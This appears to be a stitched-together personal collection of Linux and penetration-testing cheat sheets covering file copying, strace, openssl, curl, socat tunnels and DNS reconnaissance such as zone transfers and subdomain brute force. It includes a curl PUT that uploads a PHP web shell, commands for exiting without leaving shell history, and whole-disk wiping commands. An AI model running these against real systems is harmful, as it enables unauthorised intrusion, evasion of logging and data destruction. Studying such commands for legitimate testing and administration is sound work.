 #!/bin/bash function help { echo -e "\n\tusage: $0 " exit } if [ -z "$1" ]; then help fi while [ "$1" != "" ]; do if [ "$SEARCH" = "" ]; then SEARCH="$1" else SEARCH="$SEARCH $1" fi shift done echo -e "\n\tLooking up $SEARCH\n" dig +short txt "$SEARCH".wp.dg.cx echo "" 
 
 
 
 host -t txt linux.wp.dg.cx
 
 
 
 dig +short txt <keyword>.wp.dg.cx | espeak
 
 
 




SCP-Cheatsheet.sh

[+] Secure Copy (scp) Cheatsheet
--------------------------------

[>] Copy remote file to local host:

$ scp your_username@192.168.0.10:<remote_file> /some/local/directory

[>] Copy local file to remote host:

$ scp <local_file> your_username@192.168.0.10:/some/remote/directory

[>] Copy local directory to remote directory:

scp -r <local_dir> your_username@192.168.0.10:/some/remote/directory/<remote_dir>

[>] Copy a file from one remote host to another:

scp your_username@<host1>:/some/remote/directory/foobar.txt your_username@<host2>:/some/remote/directory/

[>] Improve scp performance (use blowfish):

scp -c blowfish <local_file> your_username@192.168.0.10:/some/remote/directory









##-==============================-##
##  [+] Copy Files (remotely)
##-==============================-##
scp /path/to/local/file.txt user@targetIP:/path/to/share     Local to remote
scp -r user@targetIP:/path/to/share /local/share Remote to local


scp -P $copy_port -r ~/pcaps $copy_remote_dir



# Copy a file:
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext

# Copy a directory:
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination


 Backup over SSH RSync Script
Last Updated 3 years ago

rsync -av --delete -e "ssh -p 22" root@serverto.back.up:/backups/full-system-backup.tar /backups/ > backup.log








##-===========================-##
##  [+] DNS Zone Transfer
##-===========================-##
host -l $Domain.com ns1.$Domain.com
dnsrecon -d $Domain.com -t axfr @ns1.$Domain.com
dnsenum $Domain.com
nslookup -> set type=any -> ls -d $Domain.com



##-===========================-##
##  [+] Enumerate Subdomains
##-===========================-##
for sub in $(cat subdomains.txt);do host $sub.$Domain.com|grep "has.address";done
dnsrecon -d $TARGET -D wordlist.txt -t std --xml output.xml









readlink -f /proc/<PID>/cwd				## Show current working directory of a process

readlink -f /proc/<PID>/exe				## Show actual pathname of the executed command



Bash globbing

/b?n/?at /bin/cat						## '*' serves as a "wild card" for filename expansion.

ls -l [a-z]*							## list all files with alphabet in its filename.

ls {*.sh,*.py}							## list all .sh and .py files


!!										## Run last command

$0										## name of shell or shell script.
$1, $2, $3, 							## positional parameters.
$#										## number of positional parameters.
$?										## most recent foreground pipeline exit status.
$-										## current options set for the shell.
$$										## pid of the current shell (not subshell).
$!										## is the PID of the most recent background command.




prints every line of the file.

awk '{print}' filename


Filtering out specific ip-address:

awk '/172.16.40.10.81/' error.log



awk '{print $2,$5;}' error.txt
This prints columns 2 and 5.



awk 'BEGIN {printf "IP-address \tPort\n"} /nop/ {print $3}' test.txt | head
awk 'BEGIN{printf "IP-address \tPort\n"} /nop/ {print $3} END {printf "End of the file\n"}' test.txt | tail

Here we are printing IP-address PORT to the first line of the file.

















## -------------------------------------------------------------------------------------------------- ##
	exec $SHELL -l						## Reload shell without exit
## -------------------------------------------------------------------------------------------------- ##
	disown -a && exit					## Close shell keeping all subprocess running
## -------------------------------------------------------------------------------------------------- ##
	kill -9 $$							## Exit without saving shell history
	unset HISTFILE && exit
## -------------------------------------------------------------------------------------------------- ##
	true && echo success				## Perform a branching conditional
	false || echo failed
## -------------------------------------------------------------------------------------------------- ##
	mkd() { mkdir -p "$@" && cd "$@"; }	## Create a directory and change into it at the same time
## -------------------------------------------------------------------------------------------------- ##



##-===========================================-##
##  [+] List of commands you use most often
##-===========================================-##
history | \
awk '{CMD[$2]++;count++;}END { for (a in CMD)print CMD[a] " " CMD[a]/count*100 "% " a;}' | \
grep -v "./" | \
column -c3 -s " " -t | \
sort -nr | nl |  head -n 20



## -------------------------------------------------------------------------------------------------- ##
history | cut -c 8-								## Show shell history without line numbers
fc -l -n 1 | sed 's/^\s*//'
## -------------------------------------------------------------------------------------------------- ##




## ----------------------------------------------------- ##
##  [+] Using Grep and regular expressions and output to a file
## ----------------------------------------------------- ##
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt

## ----------------------------------------------------- ##
##  [+] Use a bash loop to find the IP address behind each host
## ----------------------------------------------------- ##
for url in $(cat list.txt); do host $url; done

## ----------------------------------------------------- ##
##  [+] Collect all the IP Addresses from a log file and sort by frequency
## ----------------------------------------------------- ##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn

## ----------------------------------------------------- ##
##  [+] Decode Base64 Encoded Values
## ----------------------------------------------------- ##
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode


## ----------------------------------------------------- ##
##  [+] Decode Hexidecimal Encoded Values
## ----------------------------------------------------- ##
echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps














## -------------------------------------------------------------------------------------------------- ##
	mount -t tmpfs tmpfs /mnt -o size=64M		## Mount a temporary ram partition
## -------------------------------------------------------------------------------------------------- ##



## -------------------------------------------------------------------------------------------------- ##
	fuser /var/log/daemon.log		## Show which processes use the file
## -------------------------------------------------------------------------------------------------- ##
	fuser -v /home/$User			## Show which processes are used in the home directory
## -------------------------------------------------------------------------------------------------- ##
	fuser -ki $File					## Kills a process that is locking a file
## -------------------------------------------------------------------------------------------------- ##
	fuser -k -HUP $File				## Kills a process with specific signal
## -------------------------------------------------------------------------------------------------- ##
	fuser -v 53/udp					## Show what PID is listening on specific port
## -------------------------------------------------------------------------------------------------- ##
	fuser -mv /var/www				## Show all processes using the named filesystems or block device
## -------------------------------------------------------------------------------------------------- ##


## -------------------------------------------------------------------------------------------------- ##
	killall $Service								## Kill all processes using service
## -------------------------------------------------------------------------------------------------- ##
	kill -9 $PID                             		## Kill PID
## -------------------------------------------------------------------------------------------------- ##
	kill -s SIGHUP $(cat /run/named/named.pid)		## Reload $PID
## -------------------------------------------------------------------------------------------------- ##
	kill -s SIGHUP $PID								## Reload $PID
## -------------------------------------------------------------------------------------------------- ##
	kill -s SIGINT $PID								## Signal Interupt
## -------------------------------------------------------------------------------------------------- ##
	kill -s SIGTERM $PID							## Signal Terminate
## -------------------------------------------------------------------------------------------------- ##
	pkill -U $User									## Kill all process of a user
## -------------------------------------------------------------------------------------------------- ##


## ------------------------------------- ##
##  [+] Kill all process of a program
## ------------------------------------- ##
kill -9 $(ps aux | grep 'program_name' | awk '{print $2}')



##-=========================================-##
##  [+] Run process even once logged out 
##-=========================================-##
## ----------------------------------------------------- ##
##  [?] (immune to hangups, with output to a non-tty)
## ----------------------------------------------------- ##
nohup bash $Script.sh


## ------------------------------------ ##
##  [+] Get process ID of a process
## ------------------------------------ ##
pidof $Process


## ------------------------------------ ##
##  [+] Get process ID of a process
## ------------------------------------ ##
pgrep $Process



## ------------------------------------------------------------ ##
##  [?] echo 1 if process found, echo 0 if no such process
## ------------------------------------------------------------ ##
pgrep -q sublime_text && echo 1 || echo 0



PID=$(pidof -s ${index})
	if [[ "${PID}" != "" ]]; then





strace can utilize `pidof` command to trace processes:  

strace -p "`pidof dead_loop`"





strace -p "`pgrep dead_loop`"





## Use `-p` option to trace multiple processes: 


strace -p 2194,2195









## ----------------------------------- ##
##  [+] Track with child processes
## ----------------------------------- ##

## ------------------------------------------------------------ ##
	strace -f -p $(pidof glusterfsd)							## 1)
## ------------------------------------------------------------ ##
	strace -f $(pidof php-fpm | sed 's/\([0-9]*\)/\-p \1/g')	## 2)
## ------------------------------------------------------------ ##



## -------------------------------------------- ##
##  [+] Track process with 30 seconds limit
## -------------------------------------------- ##
timeout 30 strace $(< /var/run/zabbix/zabbix_agentd.pid)


## ------------------------------------------------------ ##
##  [+] Track processes and redirect output to a file
## ------------------------------------------------------ ##
ps auxw | grep '[a]pache' | awk '{print " -p " $2}' | \
xargs strace -o /tmp/strace-apache-proc.out



## ------------------------------------------------------------- ##
##  [+] Track with print time spent in each syscall and limit
##      the length of print strings
## ------------------------------------------------------------- ##
ps auxw | grep '[i]init_policy' | awk '{print " -p " $2}' | \
xargs strace -f -e trace=network -T -s 10000


## ------------------------------------------------ ##
##  [+] Track the open request of a network port
## ------------------------------------------------ ##
strace -f -e trace=bind nc -l 80


## --------------------------------------------------------------- ##
##  [+] Track the open request of a network port (show TCP/UDP)
## --------------------------------------------------------------- ##
strace -f -e trace=network nc -lu 80



## ------------------------------------------------------------ ##
##  [+] Intercept stdout/stderr of another process
## ------------------------------------------------------------ ##
strace -ff -e trace=write -e write=1,2 -p SOME_PID





##-=======================================-##
##  [+] Show statistics of system calls  
##-=======================================-##
## 
## ---------------------------------------------------------------------------------- ##
##  [?] `-c` option can be used to summarize the statistics of every system call: 
## ---------------------------------------------------------------------------------- ##
##  [?] strace shows the time and error count of every system call.
## ---------------------------------------------------------------------------------- ##
strace -c ls





`-C` option can print both regular output and statistics:


strace -C ls






##-========================-##
##  [x] strace -S sortby
##-========================-##
## 
## -------------------------------------------------------------------------------------- ##
##  [?] customizes histogram output sorted by: 		## (default is sorted by `time`).
##      > calls
##      > name
##      > nothing
## -------------------------------------------------------------------------------------- ##









# Print instruction pointer


`-i` option is used to print instruction pointer of calling system call. E.g.:  


strace -i ls







# Trace only system calls accessing path


`-P path` option is used to set only tracing system calls which access the specified `path`. E.g.:  


strace -P /$Dir/







strace -c -S calls ls




`-c` and `-C` options are mutually exclusive. 

notice the time here measured is system time of every system call.


strace -w -c ls












strace One-Liners

# Slow the target command and print details for each syscall:
strace command

# Slow the target PID and print details for each syscall:
strace -p PID

# Slow the target PID and any newly created child process, printing syscall details:
strace -fp PID

# Slow the target PID and record syscalls, printing a summary:
strace -cp PID

# Slow the target PID and print open() syscalls only:
strace -eopen -p PID

# Slow the target PID and print open() and stat() syscalls only:
strace -eopen,stat -p PID

# Slow the target PID and print connect() and accept() syscalls only:
strace -econnect,accept -p PID

# Slow the target command and see what other programs it launches (slow them too!):
strace -qfeexecve command

# Slow the target PID and print time-since-epoch with (distorted) microsecond resolution:
strace -ttt -p PID

# Slow the target PID and print syscall durations with (distorted) microsecond resolution:
strace -T -p PID
















Record and replay terminal session

### Record session
# 1)
script -t 2>~/session.time -a ~/session.log

# 2)
script --timing=session.time session.log

### Replay session
scriptreplay --timing=session.time session.log








## ---------------------------------------------- ##
##  [+] Testing connection to the remote host
## ---------------------------------------------- ##
echo | openssl s_client -connect $Domain:443 -showcerts


## ---------------------------------------------------------------- ##
##  [+] Testing connection to the remote host (with SNI support)
## ---------------------------------------------------------------- ##
echo | openssl s_client -showcerts -servername $Domain -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl version
## ----------------------------------------------------------------------- ##
openssl s_client -tls1_2 -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl cipher
## ----------------------------------------------------------------------- ##
openssl s_client -cipher 'AES128-SHA' -connect $Domain:443







echo | openssl s_client -connect $IPAddr:853 2>/dev/null | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64

echo | openssl s_client -connect '$IPAddr:853' 2>/dev/null | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64













shred --verbose --random-source=/dev/urandom -n 1 /dev/sda




##-========================================-##
##  [+] Secure delete with secure-delete
##-========================================-##
srm -vz /tmp/file
sfill -vz /local
sdmem -v
swapoff /dev/sda5 && sswap -vz /dev/sda5



##-====================================-##
##  [+] Secure delete with badblocks
##-====================================-##
badblocks -s -w -t random -v /dev/sda
badblocks -c 10240 -s -w -t random -v /dev/sda


##-=================================-##
##  [+] Secure delete with scrub
##-=================================-##
scrub -p dod /dev/sda
scrub -p dod -r file










# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check for title and all links
curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php








curl -sL --header "Host:viewdns.info" --referer https://viewdns.info --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" https://viewdns.info/reversewhois/?q=%40$domain > tmp
sleep 2
curl -sL --header "Host:viewdns.info" --referer https://viewdns.info --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" https://viewdns.info/reversewhois/?q=$companyurl > tmp2


curl -Iks https://www.google.com

    -I - show response headers only
    -k - insecure connection when using ssl
    -s - silent mode (not display body)

curl -Iks --location -X GET -A "x-agent" https://www.google.com

    --location - follow redirects
    -X - set method
    -A - set user-agent

curl -Iks --location -X GET -A "x-agent" --proxy http://127.0.0.1:16379 https://www.google.com

    --proxy [socks5://|http://] - set proxy server

curl -o file.pdf -C - https://example.com/Aiju2goo0Ja2.pdf

    -o - write output to file
    -C - resume the transfer

	
	
Repeat URL request

# URL sequence substitution with a dummy query string:
curl -ks https://example.com/?[1-20]

# With shell 'for' loop:
for i in {1..20} ; do curl -ks https://example.com/ ; done
	
	
# Get trace and http headers.
curl -Iks -A "x-agent" --location "${_proto}://${_domain}"
	


http -p Hh https://www.google.com

    -p - print request and response headers
        H - request headers
        B - request body
        h - response headers
        b - response body

http -p Hh https://www.google.com --follow --verify no

    -F, --follow - follow redirects
    --verify no - skip SSL verification

















































##-====================================================-##
##            [+] Generate an RSA Key Pair 
##-====================================================-##
## ---------------------------------------------------- ##
##   [?] Before you can obtain an X.509 certificate
## ---------------------------------------------------- ##
##   [?] Your web server will use this RSA key pair
##       to sign responses identifying it as the
##       bearer of the certificate.
## ---------------------------------------------------- ##
genrsa req x509 pkcs12 



##-=========================================-##
##  [+] Generate A 4096 Bit RSA Key Pair
##-=========================================-##
openssl genrsa -aes256 -out $Certificate.key 4096 



##-==========================================================-##
##  1). Create a Certificate Signing Request
## ---------------------------------------------------------- ##
##  2). Send A Request to your Certificate Authority (CA)
##      (So They Can Sign A Certificate)
##-==========================================================-##


## ---------------------------------------------------------- ##
##   [?] This states that you control the site 
##       Identified by the Common Name (CN)
## ---------------------------------------------------------- ##
##   [?] This verifies you as the owner of the Private Key
## ---------------------------------------------------------- ##
openssl req -new -key $Certificate.key -days 365 -out $Certificate.csr 



##-=========================================-##
##  [+] View The Contents of The CSR File
##-=========================================-##
openssl req -text -in $Certificate.csr 



##-=========================================-##
##  [+] Receiving A X.509 Certificate
##-=========================================-##
## ------------------------------------------------------------ ##
##   [?] You Will Receive A X.509 Certificate When Your
##       --> Certificate Authority Validates Your Identity
## ------------------------------------------------------------ ##
##  --> They Will Send You A Certificate
##  --> This Will be In PEM Format 
##  --> Saved In .cer Extension Form
## ------------------------------------------------------------ ##



##-==============================================-##
##  [+] View The Contents of This Certificate:
##-==============================================-##
openssl x509 -in $Certificate.cer -text 




##-=================================================================-##
##  [+] Package the Key and Certificate into a PKCS #12 Keystore
##-=================================================================-##
## 
## ------------------------------------------------------------------- ##
##-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-##
##    [?] A PKCS #12 Keystore Has Either A .pfx or .p12 Extensio
##-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-<+>-##
## ------------------------------------------------------------------- ##
## 
## ----------------------------------------------------------- ##
##   [?] When Combining the key and certificate
##       You will be prompted for the following:
## ----------------------------------------------------------- ##
##       --> Existing Passphrase For The Encrypted Key File
##       --> As Well As: 
##       --> New Passphrase For The PCKS #12 File
## ----------------------------------------------------------- ##
openssl pkcs12 -export -in $Certificate.cer -inkey $Certificate.key -out $Certificate.pfx 
















openssl x509 -text -in $Cert.crt -noout			## Read a certificate
openssl req -text -in $Cert.csr -noout			## Read a Certificate Signing Request
openssl req -new -key $Cert.key -out $Cert.csr	## Generate a Certificate Signing Request, given a private key




## ------------------------------------------------- ##
##  [+] Generate a Certificate Signing Request
## ------------------------------------------------- ##
##  [?] Creating also a 2048-bit RSA key pair 
##  [?] (unencrypted, for noninteractive use)
## ------------------------------------------------- ##
openssl req -new -keyout $Cert.key -out $Cert.csr -newkey rsa:2048 -nodes








openssl verify -CAfile ca.crt my.crt 





openssl req -newkey rsa:2048 -new -out my.csr -keyout my.key








openssl x509 -subject -issuer -noout -in ca.crt







openssl s_client -connect host:port -showcerts

compare the thumbprint of the received cert with 


openssl x509 -noout -text -in ca.crt








openssl x509 -req -in $Cert.csr -CAcreateserial \
-CA ca.crt -CAkey ca.key -out $Cert.crt -days validity
Sign a certificate as a CA, given a Certificate Signing
Request
openssl req -x509 -keyout $Cert.key -out $Cert.crt \
-newkey rsa:2048 -nodes -days validity
Generate a self-signed root certificate, and create a
new CA private key
openssl ca -config ca.conf -in $Cert.csr \
-out $Cert.crt -days validity -verbose
Sign a certificate
openssl ca -config ca.conf -gencrl -revoke $Cert.crt \
-crl_reason why
Revoke a certificate
openssl ca -config ca.conf -gencrl -out list.crl Generate a Certificate Revocation List containing all
revoked certificates so far
openssl x509 -in cert.pem -outform DER -out cert.der Convert a certificate from PEM to DER
openssl pkcs12 -export -in cert.pem \
-inkey cert.key -out cert.pfx -name friendlyname
Convert a certificate from PEM to PKCS#12 including
the private key
openssl pkcs12 -in cert.p12 -out cert.crt -clcerts \
-nokeys
Convert a certificate from PKCS#12 to PEM
openssl pkcs12 -in cert.p12 -out cert.key -nocerts \
-nodes
Extract the private key from a PKCS#12 certificate
openssl pkcs12 -in cert.p12 -out ca.crt -cacerts Extract the CA certificate from a PKCS#12 certificate
cat cert.crt cert.key > cert.pem Create a PEM certificate from CRT and private key
openssl dgst -hashfunction -out file.hash file Generate the digest (hash) of a file
openssl dgst -hashfunction file | cmp -b file.hash Check the hash of a file; no output means OK
openssl dgst -hashfunction -sign private.key \
-out file.sig file
Sign a file
openssl dgst -hashfunction -verify public.key \
-signature file.sig file
Verify the signature of a file
openssl enc -e -cipher -in file -out file.enc -salt Encrypt a file
openssl enc -d -cipher -in file.enc -out file Decrypt a file
openssl genpkey -algorithm RSA -cipher 3des \
-pkeyopt rsa_keygen_bits:2048 -out keypair.pem
Generate a 2048-bit RSA key pair protected by a
TripleDES-encrypted passphrase
openssl pkey -text -in private.key -noout Examine a private key
openssl pkey -in old.key -out new.key -cipher Change the passphrase of a private key
openssl pkey -in old.key -out new.key Remove the passphrase from a private key
1. openssl s_client -connect www.site.com:443 > tmpfile Inspect an SSL certificate from a website
2. CTRL-C
3. openssl x509 -in tmpfile -text
openssl list-message-digest-commands List all available hash functions
openssl list-cipher-commands List all available ciphers













##-===========================================-##
##  [+] Kill a process running on port 8080
##-===========================================-##
lsof -i :8080 | awk '{l=$2} END {print l}' | xargs kill


##-===================================-##
##  [+] Show Processes Ran By SSHD
##-===================================-##
lsof -p $( pgrep sshd )


##-==================================-##
##  [+] Show 10 Largest Open Files
##-==================================-##
lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail




##-====================================================================-##
##  [+] Ban all IPs that attempted to access phpmyadmin on your site
##-====================================================================-##
grep "phpmyadmin" $path_to_access.log | grep -Po "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort | uniq | xargs -I% sudo iptables -A INPUT -s % -j DROP






##-==============================-##
##  [+] Tree-like output in ls
##-==============================-##
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'



##-=================================================================-##
##  [+] Convert all flac files in dir to mp3 320kbps using ffmpeg
##-=================================================================-##
for FILE in *.flac; do ffmpeg -i "$FILE" -b:a 320k "${FILE[@]/%flac/mp3}"; done;



##-==============================================================-##
##  [+] Retrieve dropped connections from firewalld journaling
##-==============================================================-##
journalctl -b | grep -o "PROTO=.*" | sed -r 's/(PROTO|SPT|DPT|LEN)=//g' | awk '{print $1, $3}' | sort | uniq -c




















openssl s_client -connect target:443









##-===============================-##
##  [+] Socat TCP HTTPS Tunnel:
##-===============================-##
socat TCP4-LISTEN:443,fork TCP4:<remoteIP>:443



##-========================-======-##
##  [+] socat IPv4IPv6 Tunnel:
##-===============================-##
socat TCP4-LISTEN:80,fork,su=nobody TCP6:[2000::1:215:5dff:fe01:247]:80



##-=========================================-##
##  [+] Socat Local Link IPv4IPv6 Tunnel:
##-=========================================-##
socat TCP4-LISTEN:445,fork,su=nobody TCP6:[fe80::2d24:c19c:892:4d3%eth0]:445



debug the serial communication:

socat -v -D -d -d PTY,link=./pty1,b9600,cfmakeraw GOPEN:/dev/ttyUSB0,b9600,cfmakeraw




Record serial traffic

socat /dev/ttyS0,raw,echo=0 SYSTEM:'tee input.txt | socat - "PTY,link=/tmp/ttyV0,raw,echo=0,waitslave" | tee output.txt'




tunnel

ssh root@135.227.65.144 -L 8080:10.31.100.169:8443

socat

socat TCP-LISTEN:8443,reuseaddr,fork TCP:remoteip:8443





Listen on 443

socat file:`tty`,raw,echo=0 tcp-listen:443







nc -l -v 127.0.0.1 -v -p $port


socat TCP4-LISTEN:4430,fork SOCKS4a:127.0.0.1:$onion:$orPrt,socksport=9050 &

socat TCP4-LISTEN:4430,fork SOCKS4a:127.0.0.1:$onion:$orPrt,socksport=9050 &
































IP packet begins with an `IP header': at least 20 bytes long

         .-------+-------+---------------+-------------------------------.
         |Version|  IHL  |Type of Service|          Total Length         |
         |-------+-------+---------------+-------------------------------|
         |         Identification        |Flags|      Fragment Offset    |
         |---------------+---------------+-------------------------------|
         |  Time to Live |    Protocol   |         Header Checksum       |
         |---------------+---------------+-------------------------------|
         |                       Source Address                          |
         |---------------------------------------------------------------|
         |                    Destination Address                        |
         `---------------------------------------------------------------'


  The important fields are the Protocol, which indicates whether this is
  a TCP packet (number 6), a UDP packet (number 17) or something else,
  the Source IP Address, and the Destination IP Address.

  Now, if the protocol fields says this is a TCP packet, then a TCP
  header will immediately follow this IP header: the TCP header is also
  at least 20 bytes long:


		The most important fields here are the source port, and destination
		port, which says which service the packet is going to (or coming from,
		in the case of reply packets). The sequence and acknowledgement
		numbers are used to keep packets in order, and tell the other end what
		packets have been received. The ACK, SYN, RST and FIN flags (written
		downwards) are single bits which are used to negotiate the opening
		(SYN) and closing (RST or FIN) of connections.


         .-------------------------------+-------------------------------.
         |          Source Port          |       Destination Port        |
         |-------------------------------+-------------------------------|
         |                        Sequence Number                        |
         |---------------------------------------------------------------|
         |                    Acknowledgment Number                      |
         |-------------------+-+-+-+-+-+-+-------------------------------|
         |  Data |           |U|A|P|R|S|F|                               |
         | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
         |       |           |G|K|H|T|N|N|                               |
         |-------+-----------+-+-+-+-+-+-+-------------------------------|
         |           Checksum            |         Urgent Pointer        |
         `---------------------------------------------------------------'


 		 Following this header comes the actual message which the application
 		 sent (the packet body). A normal packet is up to 1500 bytes: this
 		 means that the most space the data can take up is 1460 bytes (20 bytes
 		 for the IP header, and 20 for the TCP header): over 97%.








echo "## =============================================================== ##"
echo "## ================= NMap Packet Fingerprinting: ================= ##"
echo "## =============================================================== ##"
echo -e "\t\t[?] Tseq is the TCP sequenceability test"
echo -e "\t\t[?] T1 is a SYN packet with a bunch of TCP options to open port"
echo -e "\t\t[?] T2 is a NULL packet w/options to open port"
echo -e "\t\t[?] T3 is a SYN|FIN|URG|PSH packet w/options to open port"
echo -e "\t\t[?] T4 is an ACK to open port w/options"
echo -e "\t\t[?] T5 is a SYN to closed port w/options"
echo -e "\t\t[?] T6 is an ACK to closed port w/options"
echo -e "\t\t[?] T7 is a FIN|PSH|URG to a closed port w/options"
echo -e "\t\t[?] PU is a UDP packet to a closed port"












##################################################################################################
## ## ## ## ## ## ## ## ## ## ## ## ## ## Mail ## ## ## ## ## ## ## ## ## ## ## ## ## ## 
##################################################################################################




## =============================================================== ##
MDAs (Mail Delivery Agents)
MTAs (Mail Transfer Agents)
MUAs (Mail User Agents)
Mail Delivery Agents (MDAs)
MIME (Multipurpose Internet Mail Extensions)
Mail Submission Agent (MSA)

Post Offi ce Protocol (POP)
Internet Message Access Protocol (IMAP).
American Standard Code for Information Interchange (ASCII)
8-bit Unicode Transformation Format (UTF-8)


Server Message Block/Common Internet File System (SMB/CIFS)

Common Unix Printing System (CUPS)
BSD Line Printer Daemon (LPD)
Printer Control Language (PCL)
Dots Per Inch (dpi)
PostScript Printer Defi nition (PPD)
Internet Printing Protocol (IPP)
Local Subnets (@LOCAL)
CUPS Driver Development Kit (DDK)
Network Security Services (NSS)			## SSL/TLS implementation
Certificate Revocation List (CRL) 
Multipurpose Internet Mail Extensions (MIME)










http://localhost:631




lsof -i :631
fuser -v -n tcp 631 		## find out owner of cupsd print daemon



find / -name master                                                     |
/usr/libexec/postfix/master



/bin/ps ax |grep 1051 |grep -v grep



## =============================================================== ##


/usr/bin/cupsdconf			## KDE CUPS Server Configuration window


cupsd.conf				## Permission, authentication, and other information for the printer daemon
printers.conf			## Addresses and options for configured printers
classes.conf			## Defines local printer classes.

echo "## ============================================================================================== ##"
client.conf (5)      - client configuration file for cups (deprecated)
cupsaccept (8)       - accept/reject jobs sent to a destination
reject (8)           - accept/reject jobs sent to a destination
cupsaddsmb (8)       - export printers to samba for windows clients
cupsctl (8)          - configure cupsd.conf options
cupsdisable (8)      - stop/start printers and classes
cupsenable (8)       - stop/start printers and classes
cupsreject (8)       - accept/reject jobs sent to a destination
cupstestdsc (1)      - test conformance of postscript files (deprecated)
cupstestppd (1)      - test conformance of ppd files
lpadmin (8)          - configure cups printers and classes
echo "## ============================================================================================== ##"

Ghostscript		## converts the print job into a form that the system’s printer can actually handle.

echo "## ============================================================================================== ##"
/etc/printcap			Printer description file		
/var/spool/*			Spool directories			
/var/spool/*/minfree	Minimum free space to leave
/dev/lp*				Line printer devices
/dev/printer			Socket for local requests
/etc/hosts.equiv		Lists machine names allowed printer access
/etc/hosts.lpd			Lists machine names allowed printer access but not under same administrative control
echo "## ============================================================================================== ##"




pandoc $File.md -s -o $Output.pdf				## create a PDF


convert it to HTML
pandoc $File.md -f markdown -t html -s -o $Output.html		## convert it to HTML


Convert your Markdown -> Word (docx): 
pandoc -o $Output.docx -f markdown -t docx $File.md





SMTPSPort="465"		## SMTP over TLS

openssl genrsa -des3 -out server.key 1024

openssl rsa -in server.key -out server.key.open 

openssl req -new -x509 -days 3650 -key server.key.open -out server.crt 












##-====================-##
##  [+] HPING3 Scans
##-====================-##
hping3 -c 3 -s 53 -p 80 -S 192.168.0.1

Open = flags = SA
Closed = Flags = RA
Blocked = ICMP unreachable
Dropped = No response


At midnight our upstream provider entered into a maintenance window. 
However they did not expect the maintenance to impact the service.

Our lead engineer was troubleshooting it from the minute the issue started.
And the issue has been resolved.
All of our network sensors show active and transmitting packets. 
If you are still having any issues, reset your router.
if it still isnt resolved call the ICS support line.













[+] Port forwarding using NCAT

ncat -lvkp 12345 -c "ncat --ssl 192.168.0.1 443"








echo "Check for DNS zone transfer."

read -p "Domain: " domain


for x in $(host -t ns $domain | cut -d ' ' -f4); do
     host -l $domain $x
done




echo "DNS Forward"

echo "Show IP addresses of subdomains."

read -p "Domain: " domain


for x in $(cat /usr/share/dnsenum/dns.txt); do
     host $x.$domain | grep 'has address' | cut -d ' ' -f1,4 >> tmp
done

column -t tmp | sort -u








whois $x.0.0.0 | egrep '(CIDR|OrgName)' >> tmp

echo >> tmp

egrep -v '(%|No address)' tmp > tmp2
cat -s tmp2 > netblocks.txt





     for URL in $(cat $FILE); do
          echo
          echo $break
          echo
          echo -e "\e[1;34m$URL\e[0m"
          HASH=$(sha256sum <<<$URL | tr -d " -")
          diff $HDIR/$URL-$HASH-$A $HDIR/$URL-$HASH-$B | grep '<iframe src='
          # frames, window.location, window.href
     done





































## ------------------------------------------------- ##


##-==============================-##
##  [+] Search DNS records
##-==============================-##
dig $Domain -t any



##-==============================-##
##  [+] Attempt a Zone Transfer
##-==============================-##
dig $Domain -t axfr							## Attempt a Zone Transfer
dnsrecon -a -d $Domain						## Attempt a Zone Transfer
nmap --script=dns-zone-transfer $Domain		## Attempt a Zone Transfer




NMAP DNS Hostnames Lookup 
NMAP DNS Hostnames Lookup 
nmap -F --dns-server <dns server ip> <target ip range>




host -t ns megacorpone.com















##-==============================-##
##  [+] Reverse DNS (PTR) Scan
##-==============================-##


##-===========================================-##
##  [+] Metasploit - Reverse DNS (PTR) Scan
##-===========================================-##

msfconsole
> use auxiliary/gather/dns_reverse_lookup
> set RANGE 192.168.1.0/24
> run





##-=======================================-##
##  [+] DNSRecon - DNS Brute Force Scan
##-=======================================-##

dnsrecon.py -t brt -d sec542.com -D /opt/dnsrecon/namelist.txt	## Default wordlist:




##-==========================================-##
##  [+] DNSRecon - Reverse DNS (PTR) Scan:
##-==========================================-##

##  [?] -r - Reverse scan flag(-r)

dnsrecon.py -r 192.168.1.0/24



Nmap: 


nmap -sL 192.168.1.0/24| grep \

    Lists(-sL) every address from 192.168.1.0 to 192.168.1.255. Append | grep \ to filter the output.










##-========================-##
##  [+] DNS Reverse
##-========================-##
echo "Perform a PTR DNS query on a Class C range and return FQDNs."

read -p "Class: " class

for x in `seq 1 254`; do
     host $class.$x | grep 'name pointer' | cut -d ' ' -f1,5
done







echo "Find all of the subdomains linked to the homepage."

read -p "Domain: " domain

wget -q www.$domain


if [ ! -e index.html ]; then
     echo
     exit
fi

grep 'href=' index.html | cut -d '/' -f3 | grep $domain | cut -d '"' -f1 > tmp

